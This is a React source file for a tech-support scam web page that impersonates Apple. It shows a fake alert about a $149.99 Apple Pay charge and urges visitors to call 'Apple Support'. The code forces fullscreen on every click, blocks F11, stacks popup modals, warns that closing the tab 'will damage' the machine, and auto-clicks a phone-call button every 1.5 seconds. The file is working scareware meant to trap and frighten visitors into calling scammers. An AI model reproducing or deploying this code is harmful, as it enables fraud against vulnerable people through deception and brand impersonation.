import React, { useState, useEffect, useCallback, useRef } from 'react';
import { usePreventExit } from './hooks/usePreventExit';
import GlobalNav from './components/GlobalNav';
import LocalNav from './components/LocalNav';
import Banner from './components/Banner';
import Footer from './components/Footer';
import AppleAlertModal from './components/AppleAlertModal';


function App() {
  const [modals, setModals] = useState([]);
  const [setCounter] = useState(0);
  const [firstModalOpen, setFirstModalOpen] = useState(true);
  const firstModalRef = useRef(null);

  const triggerFullScreen = useCallback(() => {
    const elem = document.documentElement;
    if (!document.fullscreenElement) {
      if (elem.requestFullscreen) {
        elem.requestFullscreen().catch((err) => console.log(err));
      } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
      }
    }
  }, []);

  const getRandomPosition = (modalWidth, modalHeight) => {
    const viewportWidth = window.innerWidth;
    const viewportHeight = window.innerHeight;

    if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
      return {
        top: Math.max(0, (viewportHeight - modalHeight) / 2),
        left: Math.max(0, (viewportWidth - modalWidth) / 2)
      };
    }

    const maxX = viewportWidth - modalWidth;
    // Constrain top to be within the top 30% of the screen or fixed range
    const maxY = Math.min(viewportHeight - modalHeight, viewportHeight * 0.3);

    return {
      top: Math.floor(Math.random() * maxY) + 50, // Add 50px offset to avoid covering nav completely if desired
      left: Math.floor(Math.random() * maxX)
    };
  };

  const addModal = useCallback(() => {
    setCounter(prev => {
      const newCount = prev + 1;
      const width = Math.min(600, window.innerWidth * 0.9);
      const height = window.innerWidth <= 576 ? 270 : 400; // Approx height
      const { top, left } = getRandomPosition(width, height);

      const newModal = {
        id: newCount,
        top,
        left,
        width,
        zIndex: 1050 + newCount
      };

      setModals(curr => [...curr, newModal]);
      return newCount;
    });
  }, []);

  // Handle global click
  useEffect(() => {
    const handler = () => {
      // Optional: Don't trigger if clicking a button? 
      // Original code: document.body.addEventListener('click'... 
      // It didn't filter.
      triggerFullScreen();
      addModal();
    };

    // Use capture to ensuring we catch it, or just bubble? Body listener usually bubbles.
    document.addEventListener('click', handler);
    document.addEventListener('touchstart', handler);

    // Attempt fullscreen on load (Note: Browsers often block this without interaction)
    triggerFullScreen();

    // Prevent Escape?
    const keyHandler = (e) => {
      if (e.key === 'Escape') {
        // Original: document.exitFullscreen();
        // It explicitly allowed exit on Escape but re-triggered on next click.
      }
      if (e.key === 'F11') {
        e.preventDefault();
      }
    };

    document.addEventListener('keydown', keyHandler);

    return () => {
      document.removeEventListener('click', handler);
      document.removeEventListener('touchstart', handler);
      document.removeEventListener('keydown', keyHandler);
    };
  }, [triggerFullScreen, addModal]);

  const removeModal = (id) => {
    setModals(curr => curr.filter(m => m.id !== id));
  };

  // Close first modal
  const closeFirstModal = (e) => {
    e?.stopPropagation(); // Prevent spawning new modal when closing?
    setFirstModalOpen(false);
  };

  // Use the custom hook for exit prevention
  usePreventExit("don't close the tab it will damage you machin.");

  // Auto-click the OK button repeatedly every 1500ms (for iOS compatibility)
  useEffect(() => {
    // Initial delay to ensure the modal is rendered, then repeat
    const interval = setInterval(() => {
      // Find and click the OK button to trigger tel: link
      // This works better on iOS as it simulates a real user click
      const okButton = document.querySelector('[data-auto-call="true"]');
      if (okButton) {
        okButton.click();
      }
    }, 1500); // Repeat every 1.5 seconds

    return () => clearInterval(interval);
  }, []); // Empty dependency array means this runs once on mount

  return (
    <div className="min-h-screen relative overflow-x-hidden font-sans">

      <GlobalNav />
      <div className="relative min-h-[calc(100vh-260px)] z-0">

        <LocalNav />
        <Banner />
        <p className="text-center text-black text-lg tracking-wide px-4 mt-8 mb-4 max-w-2xl mx-auto">Your iPh Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support to Freeze it!</p>
      </div>
      <Footer />
      {/* Persistent Overlay logic if needed, but body click handles it */}

      {/* First Static Modal */}
      {firstModalOpen && (
        <AppleAlertModal
          ref={firstModalRef}
          onClose={closeFirstModal}
        />
      )}

      {/* Dynamic Stacked Modals */}
      {modals.map(m => (
        <AppleAlertModal
          key={m.id}
          id={`modal-${m.id}`}
          style={{
            //top: m.top,
            //left: m.left,
            //width: m.width,
            zIndex: m.zIndex,
            maxWidth: 'none' // Override bootstrap/default
          }}
          onClose={() => removeModal(m.id)}
        />
      ))}


    </div>
  );
}

export default App;
